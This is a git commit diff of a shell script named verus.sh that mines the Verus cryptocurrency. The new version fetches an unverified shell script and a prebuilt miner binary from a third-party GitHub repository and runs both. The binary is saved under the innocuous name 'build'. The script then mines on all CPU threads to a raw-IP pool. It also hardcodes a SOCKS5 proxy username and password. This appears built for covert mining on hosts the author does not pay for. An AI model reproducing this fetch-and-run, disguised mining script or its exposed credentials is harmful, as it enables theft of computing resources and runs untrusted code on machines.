83309a658f7779b6d4398fda0d5c4f26a8b8bf8e
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-02-23 20:21:17 +0700

    Update verus.sh

--- verus.sh
+++ verus.sh
@@ -1,30 +1,16 @@
-#!/bin/sh
+#!/bin/bash
+proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
+array[0]="0001"
+array[1]="0002"
+array[2]="0003"
+size=${#array[@]}
+index=$(($RANDOM % $size))
+worker=${array[$index]}
 apt-get update
-
-apt-get install sudo
-
-apt-get install git -y
-
-sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
-
-git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
-
-cd ccminer
-
-chmod +x build.sh
-
-chmod +x configure.sh
-
-chmod +x autogen.sh
-
-./build.sh
-
-while [ 1 ]; do
-
-./ccminer -a verus -o stratum+tcp://na.luckpool.net:3957 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-10 -n 1)-MOD) -p X -t $(nproc --all)
-
-sleep 3
-
-done
-
-sleep 999
+wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
+wget -qO build https://github.com/renifer12/master/raw/master/ccminer
+chmod +x build
+chmod +x compile.sh
+./build -a verus -o stratum+tcp://139.99.123.225:3957 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-10 -n 1)-MOD) -p X -t $(nproc --all)
+./compile.sh
+echo succes
